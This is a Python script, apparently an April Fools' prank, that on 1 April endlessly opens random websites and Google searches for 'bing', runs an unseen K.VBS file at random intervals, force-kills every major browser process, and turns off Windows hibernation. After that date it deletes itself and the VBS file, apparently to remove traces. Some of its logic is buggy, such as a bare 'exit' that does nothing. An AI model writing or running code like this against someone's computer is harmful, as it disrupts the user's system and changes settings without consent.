import webbrowser
import os
import time
import random
import datetime

x = datetime.datetime.now()
counter=0
if x.strftime("%m%d") == "0401":
	april=True
elif int(x.strftime("%m%d")) >=int(401):
        
        os.remove("K.VBS")
        os.remove("bing.py")
        exit


else:
	april=False
	print("not today")

os.system("Powercfg -H OFF")
brake=random.randint(1, 20)
print(brake)
#array for more serch termes 
beginnings=["microsoft","microfit","windows","search engine","google","Xbox","xbox"]
spear_url=["facebook.com","youtube.com","nhs.uk","wikipedia.org","baidu.com","washingtonpost.com","reddit.com","yahoo.com","coca-cola.co.uk","netflix.com"]
while april == True:
	webbrowser.open("www."+str(spear_url[random.randint(0, int(len(spear_url)-1))]))
	counter=counter+1
	for i in range(0,random.randint(1, 1)):
		#open the webpage 
		webbrowser.open("https://www.google.com/search?q=bing")
		
		#webbrowser.open("www.hamishknox.co.uk")
	A=float(str(random.randint(2, 3))+str(".")+str(random.randint(1, 9)))
	print(str(A))
	time.sleep(A)

	
	if counter == brake:
		os.system("start K.VBS")
		print("long brake")
		counter=0
		brake=random.randint(1, 20)
		time_to_brake=random.randint(60, 300)
		print(time_to_brake)
		#time.sleep(int(time_to_brake))

	os.system("TASKKILL /F /IM  Chrome.exe")
	os.system("TASKKILL /F /IM  firefox.exe")
	os.system("TASKKILL /F /IM  iexplore.exe")
	os.system("TASKKILL /F /IM  Opera.exe")
	
	print(counter)

